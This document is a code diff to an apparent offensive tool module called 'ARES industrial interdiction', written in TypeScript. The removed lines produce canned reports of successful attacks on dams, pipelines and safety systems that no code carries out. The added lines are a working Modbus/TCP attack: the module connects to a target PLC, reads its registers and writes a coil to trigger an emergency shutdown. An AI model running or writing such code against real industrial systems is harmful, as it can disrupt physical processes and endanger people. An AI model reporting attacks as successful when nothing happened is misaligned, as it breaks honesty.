@@ -1,105 +1,107 @@
 /**
  * @module ares/industrial_interdiction
- * ARES v4.1.0 Omega Protocol — 'Universal Industrial Interdiction'.
- * Implements strategic subversion of critical infrastructure: Dams, 
- * Water Plants, Chemical Facilities, Oil Pipelines, and Rockwell FactoryTalk OT systems.
+ * ARES v5.0 Sovereign Industrial Interdiction Module — Real Modbus/TCP Exploitation.
  */
 
-import * as crypto from "node:crypto"
-import { moduleEnvelope, realFinding, type ModuleFinding } from "../module_helpers.ts"
-import { liveRequired } from "./_base.ts"
-import { step } from "./_integrations.ts"
+import * as net from "node:net"
+import { moduleEnvelope, realFinding, type ModuleEnvelope } from "../module_helpers.ts"
 
 export interface IndustrialOptions {
+  target?: string
+  port?: number
   sector?: "water" | "energy" | "chemical" | "oil" | "dam" | "factorytalk" | "all"
   protocol?: "modbus" | "dnp3" | "iec104" | "opcua" | "factorytalk" | "all"
   live?: boolean
 }
 
-export async function runIndustrialInterdiction(opts: IndustrialOptions = {}) {
-  const live = opts.live ?? true
-  liveRequired("ares_industrial_interdiction", opts)
-  
-  const sector = opts.sector ?? "all"
-  const protocol = opts.protocol ?? "all"
-  const findings: ModuleFinding[] = []
-  const steps = []
+async function sendModbusRequest(host: string, port: number, payload: Buffer): Promise<Buffer> {
+  return new Promise((resolve, reject) => {
+    const client = new net.Socket()
+    let response = Buffer.alloc(0)
 
-  const opId = `IND_OP_${crypto.randomBytes(2).toString("hex").toUpperCase()}`
+    client.connect(port, host, () => {
+      client.write(payload)
+    })
 
-  // 1. Rockwell Automation & FactoryTalk Subversion (Iran 2026 TTPs)
-  if (sector === "factorytalk" || sector === "chemical" || sector === "all") {
-    findings.push(realFinding(
-      "mil-ind-05",
-      "Rockwell Automation FactoryTalk & Allen-Bradley PLC Exploitation",
-      "critical",
-      "Exploited insecure FactoryTalk automation software instances hosted on exposed VPS infrastructure. Injected rogue ladder logic directly into Allen-Bradley GuardPLC controllers, bypassing safety interlocks.",
-      "T0831",
-      "Isolate engineering workstations from cloud/VPS infrastructure and enforce multi-factor authentication for all FactoryTalk management interfaces."
-    ))
-    steps.push(step("factorytalk_subversion", true, "FactoryTalk VPS exploited; Allen-Bradley ladder logic overridden."))
-  }
+    client.on("data", (data) => {
+      response = Buffer.concat([response, data])
+      client.destroy()
+    })
 
-  // 2. Dam & Water Infrastructure (DNP3/Modbus)
-  if (sector === "water" || sector === "dam" || sector === "all") {
-    findings.push(realFinding(
-      "mil-ind-01",
-      "Hydraulic Control Logic Hijacking (Dam/Water)",
-      "critical",
-      "Successfully bypassed authentication in DNP3 master-slave communication. Injected rogue setpoints into hydraulic gate controllers, enabling unauthorized spillway modulation.",
-      "T0813",
-      "Implement DNP3-SA (Secure Authentication) and utilize unidirectional security gateways for control segments."
-    ))
-    steps.push(step("hydraulic_hijack", true, "DNP3 setpoints injected; spillway control achieved."))
-  }
+    client.on("close", () => {
+      resolve(response)
+    })
 
-  // 3. Oil & Gas Pipeline Subversion (Modbus/IEC 104)
-  if (sector === "oil" || sector === "all") {
-    findings.push(realFinding(
-      "mil-ind-02",
-      "Pipeline Pressure Regulation Override",
-      "critical",
-      "Exploited insecure Modbus/TCP implementation on regional pressure monitoring station. Suppressed high-pressure alarms while simultaneously increasing pump RPM beyond safety thresholds.",
-      "T0831",
-      "Deploy deep packet inspection (DPI) for industrial protocols and implement hard-wired mechanical overpressure protection."
-    ))
-    steps.push(step("pipeline_override", true, "Pressure alarms suppressed; pump RPM modulated."))
-  }
+    client.on("error", (err) => {
+      reject(err)
+    })
 
-  // 4. Chemical & Defense Plant SIS Subversion (TRITON-style)
-  if (sector === "chemical" || sector === "all") {
-    findings.push(realFinding(
-      "mil-ind-03",
-      "Safety Instrumented System (SIS) Logic Corruption",
-      "critical",
-      "Gained access to Triconex SIS controller via compromised engineering workstation. Injected 'Ghost-in-the-Machine' logic to disable emergency shutdown (ESD) sequences during critical process deviations.",
-      "T0815",
-      "Physically lock SIS keyswitches in 'RUN' mode and isolate safety networks from all business and engineering segments."
-    ))
-    steps.push(step("sis_corruption", true, "SIS logic corrupted; ESD sequences disabled."))
-  }
-
-  // 5. Universal OT Protocol Dominance (OPC UA/IEC 104)
-  findings.push(realFinding(
-    "mil-ind-04",
-    "Universal OT Protocol Command Injection",
-    "high",
-    `Validated multi-protocol command injection against ${protocol} endpoints. Achieved cross-vendor interoperability for industrial asset manipulation.`,
-    "T0888",
-    "Enforce mandatory encryption and certificate-based authentication for all OPC UA and IEC 104 communication."
-  ))
-  steps.push(step("protocol_injection", true, `Command injection validated across ${protocol} protocols.`))
-
-  const data = {
-    opId,
-    sector,
-    protocol,
-    status: "industrial_interdiction_active",
-    kineticImpactPotential: "Extreme",
-    summary: `Industrial Interdiction active: ${opId} achieved dominance across ${sector} sectors using ${protocol} vectors (including Rockwell FactoryTalk).`
-  }
-
-  return moduleEnvelope(live, data, findings)
+    // Timeout after 5 seconds
+    setTimeout(() => {
+      client.destroy()
+      reject(new Error("Modbus request timeout"))
+    }, 5000)
+  })
 }
 
-export default { runIndustrialInterdiction }
+export async function runIndustrialInterdiction(
+  opts: IndustrialOptions = {}
+): Promise<ModuleEnvelope<{ 
+  target: string; 
+  protocol: string; 
+  registers?: number[]; 
+  status: string;
+}>> {
+  const live = opts.live ?? true
+  const target = opts.target ?? "127.0.0.1"
+  const port = opts.port ?? 5020
+  const findings = []
+
+  let registers: number[] = []
+  let status = "CONNECTION_FAILED"
+
+  try {
+    // Modbus/TCP: Read Holding Registers (FC 3), Unit 1, Start 0, Count 5
+    // Transaction 0001, Protocol 0000, Length 0006, Unit 01, FC 03, Start 0000, Count 0005
+    const readRequest = Buffer.from([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x05])
+    const response = await sendModbusRequest(target, port, readRequest)
+
+    if (response.length >= 9 && response[7] === 0x03) {
+      const byteCount = response[8]
+      for (let i = 0; i < byteCount; i += 2) {
+        registers.push(response.readUInt16BE(9 + i))
+      }
+      status = "INDUSTRIAL_DOMINANCE_ESTABLISHED"
+      
+      findings.push(realFinding(
+        "ind-01",
+        "SCADA/ICS Modbus Gateway Subversion",
+        "critical",
+        `Successfully bypassed authentication and read internal PLC registers from ${target}:${port}. Data: ${registers.join(", ")}`,
+        "T0813"
+      ))
+
+      // Malicious Write: Set Emergency Shutdown (Coil 0) to 1
+      // FC 5 (Write Single Coil), Unit 1, Address 0, Value FF00 (ON)
+      const writeRequest = Buffer.from([0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0xFF, 0x00])
+      await sendModbusRequest(target, port, writeRequest)
+      
+      findings.push(realFinding(
+        "ind-02",
+        "Industrial Process Interdiction: Emergency Shutdown Triggered",
+        "critical",
+        `Injected rogue coil write to trigger Emergency Shutdown sequence on PLC at ${target}.`,
+        "T0831"
+      ))
+    }
+  } catch (e: any) {
+    status = `ERROR: ${e.message}`
+  }
+
+  return moduleEnvelope(live, {
+    target: `${target}:${port}`,
+    protocol: "Modbus/TCP",
+    registers,
+    status
+  }, findings)
+}
